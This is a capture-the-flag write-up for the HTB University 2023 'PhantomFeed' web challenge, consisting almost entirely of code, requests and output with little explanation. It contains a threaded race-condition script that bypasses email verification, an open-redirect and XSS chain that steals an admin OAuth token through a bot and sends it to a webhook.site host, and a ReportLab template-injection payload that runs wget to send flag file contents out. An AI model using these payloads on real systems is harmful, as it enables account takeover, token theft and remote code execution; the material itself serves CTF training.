# Race Condition, OAuth without state and redirection into XSS & RCE via HTML2PDF – PhantomFeed HTB University 2023

> 原文: https://www.ctfiot.com/150402.html
> ID: 150402


```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
```



```
http {
 server {
 listen 1337;
 server_name pantomfeed;
 
 location / {
 proxy_pass http://127.0.0.1:5000;
 }

 location /phantomfeed {
 proxy_pass http://127.0.0.1:3000;
 proxy_set_header Host $host;
 proxy_set_header X-Real-IP $remote_addr;
 }

 location /backend {
 proxy_pass http://127.0.0.1:4000;
 }
 }
}
```



```
1
2
3
```



```
# [...]
if __name__ == "__main__":
 app.run(host="0.0.0.0", port=4000, threaded=True, debug=False)
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
```



```
class Users(Base):
 __tablename__ = "users"
 id = Column(Integer, primary_key=True)
 verification_code = Column(String)
 verified = Column(Boolean, default=True)
 username = Column(String)
 password = Column(String)
 email = Column(String)

class Database:
 # [...]

 def create_user(self, username, password, email):
 user = self.session.query(Users).filter(Users.username == username).first()
 if user:
 return False, None

 password_bytes = password.encode("utf-8")
 salt = bcrypt.gensalt()
 password_hash = bcrypt.hashpw(password_bytes, salt).decode()

 new_user = Users(username=username, password=password_hash, email=email)
 self.session.add(new_user)
 self.session.commit()

 return True, new_user.id

 def add_verification(self, user_id):
 verification_code = generate(12)
 self.session.query(Users).filter(Users.id == user_id).update(
 {"verification_code": verification_code, "verified": False})
 self.session.commit()
 return verification_code
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
```



```
@web.route("/register", methods=["GET", "POST"])
def register():
 if request.method == "GET":
 return render_template("register.html", title="register")

 if request.method == "POST":
 username = request.form.get("username")
 password = request.form.get("password")
 email = request.form.get("email")

 if not username or not password or not email:
 return render_template("error.html", title="error", error="missing parameters"), 400

 db_session = Database()
 # User is registed with verified = True
 user_valid, user_id = db_session.create_user(username, password, email)
 current_app.logger.error("%s registered!", username)

 if not user_valid:
 return render_template("error.html", title="error", error="user exists"), 401

 # ReDos on email to add delay for the race condition
 email_client = EmailClient(email)
 # Add a verification code and set verified = False
 verification_code = db_session.add_verification(user_id)
 email_client.send_email(f"http://phantomfeed.htb/phantomfeed/confirm?verification_code={verification_code}")
 current_app.logger.error("%s mail send!", username)
 return render_template("error.html", title="error", error="verification code sent"), 200
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
```



```
import threading
import sys
import secrets
import logging
from time import sleep

import requests

BASE_URL = "http://83.136.250.104:43770"
# BASE_URL = "http://127.0.0.1:1337"
PROXIES = {
 "http": "http://127.0.0.1:8080"
}

class User:

 def __init__(self, username=None, email=None, password=None):
 self.username = username if username else secrets.token_hex(12)
 self.email = email if email else secrets.token_hex(12) + "!@attacker.com"
 self.password = password if password else secrets.token_hex(12)
 self.verified = False

 def register(self):
 resp = requests.post(BASE_URL + "/phantomfeed/register", proxies=PROXIES, data={
 "username": self.username,
 "email": self.email,
 "password": self.password
 })
 assert resp.status_code == 200
 logging.warning("Register with '%s:%s'.", self.username, self.password)
 logging.info("Response: %s", resp.text)

 def login(self):
 resp = requests.post(BASE_URL + "/phantomfeed/login", allow_redirects=False, proxies=PROXIES, data={
 "username": self.username,
 "password": self.password
 })
 if resp.status_code != 401:
 self.verified = True
 cookies = resp.headers.get("Set-Cookie")
 logging.warning("=========================================")
 logging.warning("Login successful with '%s:%s'.", self.username, self.password)
 logging.warning("Cookies of '%s': %s", self.username, cookies)
 logging.warning("=========================================")
 # logging.warning("Register: %s", resp.text)
 elif resp.status_code == 401:
 logging.info("Login unsuccessful with '%s:%s'.", self.username, self.password)

def thread_register(user):
 user.register()

def thread_login(user):
 user.login()

def race_user_accout():
 wait = 0.03

 while True:
 logging.warning("==== WAITING %f ====", wait)
 threads = []

 tmp_user = User()
 thread = threading.Thread(target=thread_register, args=(tmp_user,))
 threads.append(thread)
 thread.start()
 for round in range(10):
 thread = threading.Thread(target=thread_login, args=(tmp_user,))
 threads.append(thread)
 thread.start()
 sleep(wait)

 for thread in threads:
 thread.join()
 
 wait += 0.01
 if wait > 0.1:
 wait = 0.03

 if tmp_user.verified:
 break

if __name__ == "__main__":
 logging.basicConfig(level=logging.WARNING)
 race_user_accout()
```



```
1
2
3
4
5
6
7
8
9
```



```
$ python3 race.py
WARNING:root:==== WAITING 0.030000 ====
WARNING:root:Register with '0c901639dfd3bc4d143aa9eb:afe3ded07f13e001ade7c4eb'.
WARNING:root:==== WAITING 0.040000 ====
WARNING:root:Register with 'b90bf08ef2fbafca8d5cb8cf:99a0ab887a6c2c8b7db1f938'.
WARNING:root:=========================================
WARNING:root:Login successful with 'b90bf08ef2fbafca8d5cb8cf:99a0ab887a6c2c8b7db1f938'.
WARNING:root:Cookies of 'b90bf08ef2fbafca8d5cb8cf': token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwaGFudG9tZmVlZC1hdXRoLXNlcnZlciIsImV4cCI6MTcwMjI0ODY2MywidXNlcl9pZCI6MjcsInVzZXJuYW1lIjoiYjkwYmYwOGVmMmZiYWZjYThkNWNiOGNmIiwidXNlcl90eXBlIjoidXNlciJ9.etjpQr7kh2S9Ejn0gNbLJJrTf4AN9I9OSqgbTBhnzbXCZroza3yN38lpkK87wpY63FKDvUfUJYfrXcxpLswLGIIzQCoK9yzAoyY1J9n6tgA9eiz01Jw22lcqhFk4xINk73gwMPWdJUPrdwg5DX5CtZcCbVf8EK-a9djY2tR_3Ns7JqaUZOdJlCTo8yFCwpuBgKkeFg1ldI7BfB2ZjV4BA0At7Y5vaU0olvtzfWjN5NIrFKEP1qDH4NzToMYZAljLEITLE26KmUGOrQ8lknFo94RB3Ej_fmHmJn_u50maepoXLEqNtiDVFhCYrO6frqIN8OM9vt5hXvFdq4DGQ3WO5A; HttpOnly; Path=/; SameSite=Strict
WARNING:root:=========================================
```



```
1
2
3
4
5
6
7
```



```
@web.route("/feed", methods=["GET", "POST"])
@auth_middleware
def feed():
 # ...
 market_link = request.form.get("market_link")
 bot_runner(market_link)
 return redirect("/phantomfeed/feed")
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
```



```
def bot_runner(link):
 # [...]
 client = webdriver.Chrome(options=chrome_options)

 token = create_jwt(1, "administrator")
 cookie = {
 "name": "token",
 "value": token,
 "domain": "127.0.0.1",
 "path": "/",
 "expiry": int((datetime.datetime.now() + datetime.timedelta(seconds=1800)).timestamp()),
 "secure": False,
 "httpOnly": True
 }
 client.add_cookie(cookie)

 client.get("http://127.0.0.1:5000" + link)
 # [...]
```



```
1
2
3
4
5
```



```
POST /phantomfeed/feed HTTP/1.1
Host: 83.136.250.104:42681
Cookie: ...

content=hello&market_link=@webhook.site/cbfec95c-1ddd-406a-a959-eb7001d9c50e?ping
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
```



```
@web.route("/oauth2/auth", methods=["GET"])
@auth_middleware
def auth():
 client_id = request.args.get("client_id")
 redirect_url = request.args.get("redirect_url")

 if not client_id or not redirect_url:
 return render_template("error.html", title="error", error="missing parameters"), 400

 return render_template("oauth2.html",
 title="oauth2 authorization",
 client_id = client_id,
 redirect_url = redirect_url
 )

@web.route("/oauth2/code", methods=["GET"])
@auth_middleware
def oauth2():
 client_id = request.args.get("client_id")
 redirect_url = request.args.get("redirect_url")

 if not client_id or not redirect_url:
 return render_template("error.html", title="error", error="missing parameters"), 400
 
 authorization_code = generate_authorization_code(request.user_data["username"], client_id, redirect_url)
 url = f"{redirect_url}?authorization_code={authorization_code}"

 return redirect(url, code=303)
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
```



```
async fetchProduct() {
 const token = this.getCookie("access_token");
 this.$axios.setHeader("Authorization", `Bearer ${token}`);
 return await this.$axios.$get(
 this.$globalValues.resourceServer + "/products/" + this.$route.params.id);
},
async orderProduct() {
 const token = this.getCookie("access_token");
 this.$axios.setHeader("Authorization", `Bearer ${token}`);
 await this.$axios.$post(
 this.$globalValues.resourceServer + "/order/" + this.$route.params.id);
 alert("Order placed");
},
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
```



```
@web.route("/oauth2/token", methods=["GET"])
@auth_middleware
def token():
 authorization_code = request.args.get("authorization_code")
 client_id = request.args.get("client_id")
 redirect_url = request.args.get("redirect_url")

 if not authorization_code or not client_id or not redirect_url:
 return render_template("error.html", title="error", error="missing parameters"), 400

 if not verify_authorization_code(authorization_code, client_id, redirect_url):
 return render_template("error.html", title="error", error="access denied"), 401

 access_token = create_jwt(request.user_data["user_id"], request.user_data["username"])
 
 return json.dumps({ 
 "access_token": access_token,
 "token_type": "JWT",
 "expires_in": current_app.config["JWT_LIFE_SPAN"],
 "redirect_url": redirect_url
 })
```



```
1
```



```
<script>window.location.href=`https://webhook.site/cbfec95c-1ddd-406a-a959-eb7001d9c50e?access_token=${btoa(document.body.innerHTML)}`</script>
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
```



```
<script>
const redirect_url = 'https://webhook.site/cbfec95c-1ddd-406a-a959-eb7001d9c50e%3F%3Cscript%3Ewindow.location.href%3D%60https%3A%2F%2Fwebhook.site%2Fcbfec95c-1ddd-406a-a959-eb7001d9c50e%3Faccess_token%3D%24%7Bbtoa(document.body.innerHTML)%7D%60%3C%2Fscript%3E';

if (!window.location.href.includes("authorization_code") && !window.location.href.includes("access_token")) {
 window.location.href=`http://127.0.0.1:3000/phantomfeed/oauth2/code?client_id=phantom-market&redirect_url=${redirect_url}`;
} else if (window.location.href.includes("authorization_code") && window.location.href.includes("window")) {
 const authorization_code = window.location.href.split("authorization_code=")[1];
 window.location.href=`http://127.0.0.1:3000/phantomfeed/oauth2/token?client_id=phantom-market&authorization_code=${authorization_code}&redirect_url=${redirect_url}`;
}
</script>
```



```
1
2
3
4
5
6
```



```
{
 "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwaGFudG9tZmVlZC1hdXRoLXNlcnZlciIsImV4cCI6MTcwMjE1NjQyNiwidXNlcl9pZCI6MSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl90eXBlIjoiYWRtaW5pc3RyYXRvciJ9.EcdimB9HubgiDBC9c1ueEXiqsz7kpeugpkoA3afuF3uuVODiXMhzNavMjFRAMpXSmaqy6Cyhz0wad7RRomEjqPvjcUY0zfFJLdvQCAqldlJkDpawggXyP8kSa45jitLkyL2LVJAZRmjNEjLuJQavMp2FaDV4hsUa4SemIh2zZIAN9131Vqj_7WV2R-dB3cQ_KAlWVNi0v_756ehnmjuBSo10XeZkE9QSZsIW4Kl1sOU8aqKhJtPvX0No9m84J7YjRrFWk-ptBwdz92yp7s2QHxPI1ksNL0d6CoefEY6x2D3fl0DH3PNOGp5fF8qBgfXSuhPwrB4CqEpjkLykBQmsSQ",
 "token_type": "JWT",
 "expires_in": 1800,
 "redirect_url": "https://webhook.site/cbfec95c-1ddd-406a-a959-eb7001d9c50e?<script>window.location.href=`https://webhook.site/cbfec95c-1ddd-406a-a959-eb7001d9c50e?access_token=${btoa(document.body.innerHTML)}`</script>"
}
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
```



```
from reportlab.platypus import SimpleDocTemplate, Paragraph, Table, TableStyle
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from io import BytesIO

class HTML2PDF():
 def __init__(self):
 self.stream_file = BytesIO()
 self.content = []

 # [...]

 def add_paragraph(self, text):
 self.content.append(Paragraph(text))

 def convert(self, html, data):
 doc = self.get_document_template(self.stream_file)
 self.add_paragraph(html)
 self.add_table(data)
 self.build_document(doc, self.content)
 return self.stream_file
```



```
1
2
3
4
5
```



```
<para>
 <font color="{{ color }}">
 Orders:
 </font>
</para>
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
```



```
@web.route("/orders/html", methods = ["POST"])
@admin_middleware
def orders_html():
 color = request.form.get("color")
 db_session = Database()
 orders = db_session.get_all_orders()
 # [...]
 orders_template = render_template("orders.html", color=color)
 
 html2pdf = HTML2PDF()
 pdf = html2pdf.convert(orders_template, orders)

 pdf.seek(0)
 return send_file(pdf, as_attachment=True, download_name="orders.pdf", mimetype="application/pdf")
```



```
1
2
3
4
5
6
7
```



```
POST /backend/orders/html HTTP/1.1
Host: 83.136.250.104:42681
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwaGFudG9tZmVlZC1hdXRoLXNlcnZlciIsImV4cCI6MTcwMjE1NjQyNiwidXNlcl9pZCI6MSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl90eXBlIjoiYWRtaW5pc3RyYXRvciJ9.EcdimB9HubgiDBC9c1ueEXiqsz7kpeugpkoA3afuF3uuVODiXMhzNavMjFRAMpXSmaqy6Cyhz0wad7RRomEjqPvjcUY0zfFJLdvQCAqldlJkDpawggXyP8kSa45jitLkyL2LVJAZRmjNEjLuJQavMp2FaDV4hsUa4SemIh2zZIAN9131Vqj_7WV2R-dB3cQ_KAlWVNi0v_756ehnmjuBSo10XeZkE9QSZsIW4Kl1sOU8aqKhJtPvX0No9m84J7YjRrFWk-ptBwdz92yp7s2QHxPI1ksNL0d6CoefEY6x2D3fl0DH3PNOGp5fF8qBgfXSuhPwrB4CqEpjkLykBQmsSQ
Content-Type: application/x-www-form-urlencoded
Content-Length: 507

color=[[[getattr(pow, Word('__globals__'))['os'].system('wget https://webhook.site/cbfec95c-1ddd-406a-a959-eb7001d9c50e?$(cat /flag*)') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'
```
